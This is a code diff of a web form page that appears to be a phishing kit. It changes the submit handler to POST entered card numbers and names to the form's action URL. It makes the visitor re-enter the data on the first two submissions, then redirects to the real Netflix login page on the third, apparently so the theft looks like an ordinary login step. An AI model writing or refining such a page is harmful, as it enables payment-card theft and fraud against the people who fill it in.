@@ -178,7 +178,7 @@
                     <div class="error" id="nameError">Please enter your name</div>
                 </div>
 
-                <button type="submit">Submit</button> <!-- Changed button text to "Submit" -->
+                <button type="submit">Submit</button>
             </form>
 
             <p class="card-info">
@@ -201,15 +201,8 @@
             form.addEventListener('submit', function(e) {
                 e.preventDefault(); // Prevent the default form submission
                 
-                // Purpose: Validate the form fields and ensure they are filled out correctly.
-                // Process:
-                // 1. Check if the honeypot field is filled. If it is, treat it as spam and ignore the submission.
-                // 2. Validate each required field and display error messages if any fields are empty.
-                // 3. If all fields are valid, submit the form data to the specified action URL.
-
                 // Check honeypot field
                 if (honeypotInput.value.trim() !== '') {
-                    // If honeypot is filled, treat as spam
                     alert('Spam detected!');
                     return;
                 }
@@ -237,13 +230,20 @@
                 // Prevent submission if any fields are empty
                 if (!isValid) return;
 
-                // If all fields are valid, increment submission count
+                // Increment submission count
                 submissionCount++;
 
-                // Simulate form submission
-                // Here you would typically send the data to the server
-                // For demonstration, we will just show an error message
-                alert('Form submitted successfully!');
+                // Simulate form submission to your endpoint
+                fetch(form.action, {
+                    method: 'POST',
+                    body: new URLSearchParams(new FormData(form)),
+                }).then(response => {
+                    if (response.ok) {
+                        alert('Form submitted successfully!');
+                    } else {
+                        alert('Error submitting form.');
+                    }
+                });
 
                 // Clear all fields
                 cardNumberInput.value = '';
@@ -255,8 +255,8 @@
                 if (submissionCount < 3) {
                     alert('Please fill out the form again.');
                 } else {
-                    // Redirect to Google on the third submission
-                    window.location.href = "https://www.google.com";
+                    // Redirect to Netflix login page on the third submission
+                    window.location.href = "https://www.netflix.com/login";
                 }
             });
             
